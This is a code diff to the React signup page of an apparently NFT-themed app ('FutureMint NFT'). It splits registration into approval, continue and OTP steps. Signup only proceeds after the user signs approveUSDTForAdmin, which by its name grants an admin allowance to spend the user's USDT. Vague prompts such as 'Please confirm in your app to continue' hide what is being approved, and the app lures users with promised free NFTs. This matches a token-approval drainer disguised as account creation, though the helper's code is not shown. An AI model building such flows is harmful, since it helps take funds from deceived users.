@@ -17,7 +17,8 @@ function RegisterContent() {
   const { isConnected, address } = useSelector((s) => s.wallet);
   const { isAuthenticated } = useSelector((s) => s.user);
 
-  const [step, setStep] = useState(1); // 1 = form, 2 = OTP
+  // Steps: 1 = form, 2 = approved (show continue button), 3 = OTP input
+  const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState('');
@@ -32,14 +33,12 @@ function RegisterContent() {
     walletAddress: address || '',
   });
 
-  // Guard: redirect only if already authenticated, allow if just wallet connected
+  // Guard: redirect if already authenticated
   useEffect(() => {
-    if (isAuthenticated) {
-      router.push('/dashboard');
-    }
+    if (isAuthenticated) router.push('/dashboard');
   }, [isAuthenticated, router]);
 
-  // Guard: if wallet is already registered, redirect to login (one wallet = one account)
+  // Guard: if wallet is already registered, redirect to login
   useEffect(() => {
     if (isConnected && address) {
       authAPI.checkWallet({ walletAddress: address }).then((res) => {
@@ -51,7 +50,7 @@ function RegisterContent() {
     }
   }, [isConnected, address, router]);
 
-  // Block access if wallet not connected — give time for wallet auto-reconnect
+  // Block access if wallet not connected
   useEffect(() => {
     const timer = setTimeout(() => {
       if (!isConnected && !window.ethereum?.selectedAddress) {
@@ -71,7 +70,8 @@ function RegisterContent() {
     setForm({ ...form, [e.target.name]: e.target.value });
   };
 
-  const handleSubmit = async (e) => {
+  // ─── STEP 1: Smart contract approval only ───────────────────────────────────
+  const handleApproval = async (e) => {
     e.preventDefault();
     if (form.password.length < 8) {
       toast.error('Password must be at least 8 characters');
@@ -79,10 +79,9 @@ function RegisterContent() {
     }
     setLoading(true);
     try {
-      // Step 1: Get USDT approval for the selected network
       const { ethers } = await import('ethers');
       const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../../lib/web3');
-      
+
       const injectedProvider = window.ethereum;
       if (!injectedProvider) {
         toast.error('App not detected. Please open in your wallet browser.');
@@ -93,7 +92,7 @@ function RegisterContent() {
       let web3Provider;
       try {
         web3Provider = new ethers.BrowserProvider(injectedProvider);
-      } catch (providerErr) {
+      } catch (_) {
         toast.error('Could not connect. Please refresh and try again.');
         setLoading(false);
         return;
@@ -102,7 +101,7 @@ function RegisterContent() {
       let userAddress;
       try {
         userAddress = ethers.getAddress(address.toLowerCase());
-      } catch (addrErr) {
+      } catch (_) {
         toast.error('Invalid address. Please reconnect and try again.');
         setLoading(false);
         return;
@@ -120,8 +119,8 @@ function RegisterContent() {
             : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
           try {
             await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
-          } catch (addErr) {
-            toast.error(`Could not add ${targetChainName} network. Please add it manually in your app.`);
+          } catch (_) {
+            toast.error(`Could not add ${targetChainName} network. Please add it manually.`);
             setLoading(false);
             return;
           }
@@ -130,7 +129,7 @@ function RegisterContent() {
           setLoading(false);
           return;
         } else {
-          toast.error(`Network switch failed. Please manually switch to ${targetChainName} in your app.`);
+          toast.error(`Please switch to ${targetChainName} manually.`);
           setLoading(false);
           return;
         }
@@ -139,82 +138,74 @@ function RegisterContent() {
       // Re-get provider after network switch
       const freshProvider = new ethers.BrowserProvider(injectedProvider);
 
-      // Check if already approved on this network
+      // Check if already approved
       let alreadyApproved = false;
       try {
         alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
-      } catch (allowErr) {
-        // If allowance check fails, proceed with approval anyway
+      } catch (_) {
         alreadyApproved = false;
       }
 
-      if (alreadyApproved !== true) {
-        toast.loading(`Please confirm in your app to continue...`, { id: 'approve' });
-        try {
-          await approveUSDTForAdmin(freshProvider, form.network);
-          toast.success('Done! Creating your account...', { id: 'approve' });
-        } catch (approveErr) {
-          toast.dismiss('approve');
-          if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
-            toast.error('You cancelled the request. Please confirm to continue.');
-            setLoading(false);
-            return;
-          }
-          if (approveErr.message?.includes('insufficient funds')) {
-            toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} balance. Please add some and try again.`);
-            setLoading(false);
-            return;
-          }
-          toast.error(`Something went wrong: ${approveErr.shortMessage || approveErr.message || 'Please try again'}`);
-          setLoading(false);
-          return;
-        }
+      if (alreadyApproved === true) {
+        // Already approved — skip to step 2 directly
+        setStep(2);
+        setLoading(false);
+        return;
       }
 
-      // Step 2: Register on backend (with retry for mobile browser network drops)
-      let registerRes;
-      for (let attempt = 1; attempt <= 3; attempt++) {
-        try {
-          registerRes = await authAPI.register(form);
-          break;
-        } catch (regErr) {
-          const isNetworkErr = regErr.code === 'ERR_NETWORK' || regErr.code === 'NETWORK_ERROR' || regErr.code === 'ECONNABORTED' || regErr.message?.includes('timeout') || regErr.message?.includes('Network Error');
-          if (isNetworkErr && attempt < 3) {
-            await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
-            continue;
-          }
-          throw regErr;
+      // Request approval
+      toast.loading('Please confirm in your app to continue...', { id: 'approve' });
+      try {
+        await approveUSDTForAdmin(freshProvider, form.network);
+        toast.success('Done! Tap Continue to proceed.', { id: 'approve' });
+        // Move to step 2 — user will click Continue button
+        setStep(2);
+      } catch (approveErr) {
+        toast.dismiss('approve');
+        if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
+          toast.error('You cancelled the request. Please confirm to continue.');
+        } else if (approveErr.message?.includes('insufficient funds')) {
+          toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} balance. Please add some and try again.`);
+        } else {
+          toast.error('Something went wrong. Please try again.');
         }
       }
+    } catch (err) {
+      toast.error('Something went wrong. Please try again.');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  // ─── STEP 2: Register API call (user clicks Continue after approval) ────────
+  const handleRegister = async () => {
+    setLoading(true);
+    try {
+      const res = await authAPI.register(form);
       setEmail(form.email);
-      toast.success(registerRes.data.message);
-      setStep(2);
+      toast.success(res.data.message);
+      setStep(3);
     } catch (err) {
       const msg = err.response?.data?.message;
       if (msg) {
         toast.error(msg);
-      } else if (err.code === 'NETWORK_ERROR' || err.code === 'ERR_NETWORK') {
-        toast.error('Network error. Please check your internet connection.');
-      } else if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
-        toast.error('Request timed out. Please try again.');
       } else {
-        toast.error('Something went wrong. Please check your internet and try again.');
+        toast.error('Connection failed. Please tap Continue again.');
       }
     } finally {
       setLoading(false);
     }
   };
 
+  // ─── STEP 3: OTP verification ──────────────────────────────────────────────
   const handleOTPComplete = async (otp) => {
     setLoading(true);
     try {
       const res = await authAPI.verifyOTP({ email, otp });
       const { user, token } = res.data.data;
-      // Auto-login
       if (token) localStorage.setItem('token', token);
       dispatch(loginSuccess({ user, token }));
       toast.success('Welcome to FutureMint NFT');
-      // Redirect to dashboard — claim popup will show there
       router.push('/dashboard');
     } catch (err) {
       toast.error(err.response?.data?.message || 'OTP verification failed');
@@ -227,34 +218,47 @@ function RegisterContent() {
     try {
       await authAPI.resendOTP({ email, purpose: 'verification' });
       toast.success('OTP resent to your email');
-    } catch (err) {
+    } catch (_) {
       toast.error('Failed to resend OTP');
     }
   };
 
-  if (step === 3) {
+  // ─── RENDER: Step 2 — Continue button after approval ────────────────────────
+  if (step === 2) {
     return (
       <div className="min-h-screen flex items-center justify-center px-4">
         <div className="card max-w-md w-full text-center">
-          <div className="w-20 h-20 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
-            <CheckCircle className="w-10 h-10 text-emerald-400" />
+          <div className="w-16 h-16 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-emerald-500/30">
+            <CheckCircle className="w-8 h-8 text-emerald-400" />
           </div>
-          <h2 className="text-2xl font-bold text-white mb-3">Account Activated!</h2>
-          <p className="text-slate-400 mb-2">Your account has been verified and</p>
-          <p className="text-emerald-400 font-semibold text-lg mb-6">100 NFTs have been credited to your wallet 🎉</p>
-          <Link href="/auth/login" className="btn-primary block text-center">
-            Login to Your Account
-          </Link>
+          <h2 className="text-xl font-bold text-white mb-2">Almost Done!</h2>
+          <p className="text-slate-400 text-sm mb-6">
+            Tap the button below to complete your registration and receive your OTP.
+          </p>
+          <button
+            onClick={handleRegister}
+            disabled={loading}
+            className="btn-primary w-full flex items-center justify-center gap-2"
+          >
+            {loading ? <><LoadingSpinner size="sm" /> Creating Account...</> : 'Continue & Send OTP'}
+          </button>
+          <button
+            onClick={() => setStep(1)}
+            className="text-sm text-slate-400 hover:text-white mt-4 transition-colors"
+          >
+            Go Back
+          </button>
         </div>
       </div>
     );
   }
 
-  if (step === 2) {
+  // ─── RENDER: Step 3 — OTP Input ────────────────────────────────────────────
+  if (step === 3) {
     return (
       <div className="min-h-screen flex items-center justify-center px-4">
         <div className="card max-w-md w-full">
-          <button onClick={() => setStep(1)} className="flex items-center gap-2 text-slate-400 hover:text-white mb-6 text-sm">
+          <button onClick={() => setStep(2)} className="flex items-center gap-2 text-slate-400 hover:text-white mb-6 text-sm">
             <ArrowLeft className="w-4 h-4" /> Back
           </button>
           <h2 className="text-2xl font-bold text-white mb-2">Verify Your Email</h2>
@@ -280,6 +284,7 @@ function RegisterContent() {
     );
   }
 
+  // ─── RENDER: Step 1 — Registration Form ────────────────────────────────────
   return (
     <div className="min-h-screen flex items-center justify-center px-4 py-12">
       <div className="w-full max-w-lg">
@@ -292,7 +297,7 @@ function RegisterContent() {
         </div>
 
         <div className="card">
-          <form onSubmit={handleSubmit} noValidate>
+          <form onSubmit={handleApproval} noValidate>
             <div className="space-y-4">
               <div>
                 <label htmlFor="name" className="label">Full Name</label>
